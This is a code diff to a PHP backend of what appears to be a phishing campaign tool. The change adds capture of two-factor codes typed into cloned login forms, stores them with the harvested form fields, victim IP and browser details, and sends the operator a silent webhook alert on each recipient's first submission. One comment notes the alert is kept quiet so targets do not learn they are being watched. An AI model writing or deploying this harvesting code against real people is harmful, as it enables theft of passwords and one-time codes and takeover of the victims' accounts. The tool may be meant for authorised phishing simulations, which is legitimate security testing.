@@ -8,6 +8,8 @@ if (!file_exists($_db_file)) {
 }
 require_once($_db_file);
 require_once(dirname(__FILE__) . '/spear/manager/common_functions.php');
+require_once(dirname(__FILE__) . '/spear/manager/secret_at_rest.php');
+require_once(dirname(__FILE__) . '/spear/manager/capture_alerting.php');
 require_once(dirname(__FILE__) . '/spear/libs/browser_detect/BrowserDetection.php');
 date_default_timezone_set('UTC');
 //-------------------------------------
@@ -78,13 +80,45 @@ elseif(is_numeric($page)){
         $POSTJ['form_field_data'][$i] = htmlspecialchars($POSTJ['form_field_data'][$i]);
     }
     $form_field_data = json_encode($POSTJ['form_field_data']);
-	
-	$stmt = $conn->prepare("INSERT INTO tb_data_webform_submit(tracker_id,session_id,rid,public_ip,ip_info,user_agent,screen_res,time,browser,platform,device_type,page,form_field_data) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)");
-	$stmt->bind_param('sssssssssssss', $trackerId,$session_id,$rid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browser,$user_os,$device_type,$page,$form_field_data);
-	if ($stmt->execute() === TRUE)
-		die('success'); 
-	else 
-		die("failed"); 
+
+    // Phase 3.42: optional 2FA code (cloned login forms with a code field
+    // send it as POSTJ.code_2fa). Stored alongside the field-data row.
+    $code_2fa = isset($POSTJ['code_2fa'])
+        ? htmlspecialchars(substr((string)$POSTJ['code_2fa'], 0, 16))
+        : null;
+    $has_2fa = $code_2fa !== null && $code_2fa !== '';
+
+    $is_first = taphish_is_first_capture($conn, $trackerId, $rid);
+
+    $stmt = $conn->prepare("INSERT INTO tb_data_webform_submit(tracker_id,session_id,rid,public_ip,ip_info,user_agent,screen_res,time,browser,platform,device_type,page,form_field_data,code_2fa) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)");
+    $stmt->bind_param('ssssssssssssss', $trackerId,$session_id,$rid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browser,$user_os,$device_type,$page,$form_field_data,$code_2fa);
+    if ($stmt->execute() === TRUE) {
+        if ($is_first) {
+            // First capture per recipient on this campaign — fire the
+            // operator webhook if one is configured. Failure is silent
+            // (we don't want to leak that we're watching).
+            $hook_url = taphish_get_capture_webhook_url($conn);
+            if ($hook_url !== '') {
+                $payload = taphish_capture_webhook_payload([
+                    'campaign'        => '', // tracker_id, no campaign-name lookup here
+                    'campaign_id'     => $trackerId,
+                    'recipient_name'  => '',
+                    'recipient_email' => '',
+                    'captured_at'     => $date_time,
+                    'page'            => (int)$page,
+                    'ip'              => $public_ip,
+                    'has_2fa'         => $has_2fa,
+                ]);
+                @taphish_capture_dispatch_webhook($hook_url, $payload);
+            }
+            if (function_exists('logIt')) {
+                logIt('Capture: first submit on tracker ' . $trackerId . ($has_2fa ? ' [+2FA]' : ''));
+            }
+        }
+        die('success');
+    } else {
+        die("failed");
+    }
 }
 
 //-----------------------------------------
